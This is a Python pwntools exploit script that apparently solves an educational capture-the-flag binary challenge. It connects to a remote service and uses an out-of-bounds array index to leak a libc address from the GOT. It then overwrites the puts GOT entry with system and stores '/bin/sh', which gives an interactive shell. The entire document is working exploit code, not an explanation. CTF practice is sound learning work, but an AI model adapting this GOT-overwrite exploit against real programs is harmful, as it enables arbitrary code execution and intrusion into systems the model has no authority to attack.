from pwn import *

# dump memory 
def dump_memory(i):
    io.sendlineafter(b'idx: ', str(i).encode())
    leak = io.recvline()[:-1] # remove newline
    print(f'users[{i}] ({i*8} bytes offset) = {leak.hex()} ({len(leak)})')
    io.sendlineafter(b'idx: ', b'1')
    io.sendlineafter(b'data: ', b'aaa')
    return leak

def edit_entry(i, data):
    io.sendlineafter(b'idx: ', b'1')
    io.sendlineafter(b'idx: ', str(i).encode())
    io.sendlineafter(b'data: ', data)
    print(f'edit users[{i}] = {data}')

elf = ELF('./src/share/chal')
libc = elf.libc
# io = process(elf.path)
# io = remote('localhost', 10203)
io = remote('edu-ctf.zoolab.org', 10203)

pause()

entries = list(elf.got.keys())[-4:] # last 4 entries
print(f'availble entries to leak: {entries}')
libc_base = 0 

dump_memory(0) # update plts
for entry in entries:
    # leak libc
    diff = elf.got[entry] - elf.symbols['users']
    print(f'\'{entry}\' - users = {diff}')
    libc_func_addr = dump_memory(diff // 8) 
    if len(libc_func_addr) >= 6:
        # good addr
        libc_func = u64(libc_func_addr.ljust(8, b'\x00'))
        print(f'{entry} = {hex(libc_func)}') 
        libc_base = libc_func - libc.symbols[entry]
        break

print(f'libc base = {hex(libc_base)}')
system_addr = libc_base + libc.symbols['system']
print(f'system = {hex(system_addr)}')

diff = elf.got['puts'] - elf.symbols['users']
edit_entry(0, b'/bin/sh\x00') # users[1] = "/bin/sh"
edit_entry(diff // 8, p64(system_addr)[:7]) # got['puts'] = system

# pause()

io.sendlineafter(b'idx: ', b'0')
# dump_memory(0) # puts(users[0]) -> system(users[0])
io.interactive()




